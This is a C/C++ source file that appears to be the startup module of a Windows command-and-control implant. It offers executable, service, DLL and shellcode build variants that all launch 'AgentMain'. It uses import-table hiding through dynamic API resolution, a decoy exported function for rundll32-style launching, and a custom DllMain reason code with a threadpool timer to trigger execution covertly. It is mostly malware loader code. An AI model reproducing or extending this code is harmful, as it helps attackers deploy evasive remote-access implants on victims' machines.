#include "main.h"
#include "config.h"
#include "ApiLoader.h"

#if defined(IAT_HIDING) || defined(API_RESOLUTION_GETPROCADDRESS)
#define USE_API_TABLE_STARTUP
#endif

static BOOL EnsureStartupApiLoaded()
{
#if defined(USE_API_TABLE_STARTUP)
    return ApiWin || ApiLoad();
#else
    return ApiLoad();
#endif
}

#if defined(DEBUG)

int main()
{
    if (!EnsureStartupApiLoaded())
        return 0;
    AgentMain(NULL);
    return 0;
}

#elif defined(BUILD_SVC)

SERVICE_STATUS        ServiceStatus = { 0 };
SERVICE_STATUS_HANDLE hStatus;

void ServiceMain(int argc, char** argv);
void ControlHandler(DWORD request);

void ServiceMain(int argc, char** argv)
{
    CHAR* SvcName = getServiceName();
    if (!EnsureStartupApiLoaded())
        return;
#if defined(USE_API_TABLE_STARTUP)
    hStatus = ApiWin->RegisterServiceCtrlHandlerA(SvcName, (LPHANDLER_FUNCTION)ControlHandler);
#else
    hStatus = RegisterServiceCtrlHandlerA(SvcName, (LPHANDLER_FUNCTION)ControlHandler);
#endif
    if (!hStatus)
        return;

    ServiceStatus.dwServiceType = SERVICE_WIN32;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;

    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
#if defined(USE_API_TABLE_STARTUP)
    ApiWin->SetServiceStatus(hStatus, &ServiceStatus);
#else
    SetServiceStatus(hStatus, &ServiceStatus);
#endif

    AgentMain(NULL);

    ServiceStatus.dwCurrentState = SERVICE_STOPPED;
#if defined(USE_API_TABLE_STARTUP)
    ApiWin->SetServiceStatus(hStatus, &ServiceStatus);
#else
    SetServiceStatus(hStatus, &ServiceStatus);
#endif
}

void ControlHandler(DWORD request)
{
    switch (request) {
    case SERVICE_CONTROL_STOP:
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        break;
    case SERVICE_CONTROL_SHUTDOWN:
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        break;
    default:
        break;
    }

#if defined(USE_API_TABLE_STARTUP)
    if (ApiWin && ApiWin->SetServiceStatus)
        ApiWin->SetServiceStatus(hStatus, &ServiceStatus);
#else
    SetServiceStatus(hStatus, &ServiceStatus);
#endif
}

int main()
{
    if (!EnsureStartupApiLoaded())
        return 0;

    SERVICE_TABLE_ENTRYA ServiceTable[2];
    CHAR* SvcName = getServiceName();
    ServiceTable[0].lpServiceName = (LPSTR)SvcName;
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTIONA)ServiceMain;

    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;

#if defined(USE_API_TABLE_STARTUP)
    ApiWin->StartServiceCtrlDispatcherA(ServiceTable);
#else
    StartServiceCtrlDispatcherA(ServiceTable);
#endif

    return 0;
}

#elif defined(BUILD_DLL)

#define _WIN32_WINNT 0x0600
#include <threadpoolapiset.h>

// Global synchronization primitives
static volatile LONG g_AgentInitialized = FALSE;
static volatile LONG g_LockInitialized = FALSE;
static CRITICAL_SECTION g_InitLock;

// Initialize critical section during DLL load
void InitializeSynchronization()
{
    if (!EnsureStartupApiLoaded())
        return;

    if (InterlockedCompareExchange(&g_LockInitialized, TRUE, FALSE) == FALSE)
#if defined(USE_API_TABLE_STARTUP)
        ApiWin->InitializeCriticalSection(&g_InitLock);
#else
        InitializeCriticalSection(&g_InitLock);
#endif
}

void run()
{
    InitializeSynchronization();

    if (InterlockedCompareExchange(&g_AgentInitialized, TRUE, FALSE) == FALSE) {
        AgentMain(NULL);
    }
}

extern "C" __declspec(dllexport) void CALLBACK GetVersions(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    InitializeSynchronization();

    if (InterlockedCompareExchange(&g_AgentInitialized, TRUE, FALSE) == FALSE) {
        AgentMain(NULL);
    }
}

VOID CALLBACK InitializationCallback(PTP_CALLBACK_INSTANCE Instance, PVOID Context, PTP_TIMER Timer)
{
    // Execute initialization without loader lock constraints
#if defined(USE_API_TABLE_STARTUP)
    if (ApiWin && ApiWin->CloseThreadpoolTimer)
        ApiWin->CloseThreadpoolTimer(Timer);
#else
    CloseThreadpoolTimer(Timer);
#endif
    run();
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) {
        // Do nothing on normal DLL load (fdwReason 1).
        // Initialization is deferred until called with fdwReason 4.
    } else if (ul_reason_for_call == 4) {
        // Custom reason code: start the full init sequence and main program flow.
        InitializeSynchronization();

#if defined(USE_API_TABLE_STARTUP)
        PTP_TIMER timer = ApiWin ? ApiWin->CreateThreadpoolTimer(InitializationCallback, NULL, NULL) : NULL;
#else
        PTP_TIMER timer = CreateThreadpoolTimer(InitializationCallback, NULL, NULL);
#endif
        if (timer) {
            FILETIME dueTime = { 0 };
#if defined(USE_API_TABLE_STARTUP)
            ApiWin->SetThreadpoolTimer(timer, &dueTime, 0, 0);
#else
            SetThreadpoolTimer(timer, &dueTime, 0, 0);
#endif
        }
    } else if (ul_reason_for_call == DLL_PROCESS_DETACH) {
        // Cleanup if loader allows
        if (!lpReserved && g_LockInitialized)
#if defined(USE_API_TABLE_STARTUP)
            if (ApiWin && ApiWin->DeleteCriticalSection)
                ApiWin->DeleteCriticalSection(&g_InitLock);
#else
            DeleteCriticalSection(&g_InitLock);
#endif
    }
    return TRUE;
}

#elif defined(BUILD_SHELLCODE)

__declspec(dllexport) void GetVersions() {};

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
    if (!EnsureStartupApiLoaded())
        return FALSE;
    AgentMain(NULL);
    return TRUE;
}
#else

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
    if (!EnsureStartupApiLoaded())
        return 0;
    AgentMain(NULL);
    return 0;
}

#endif
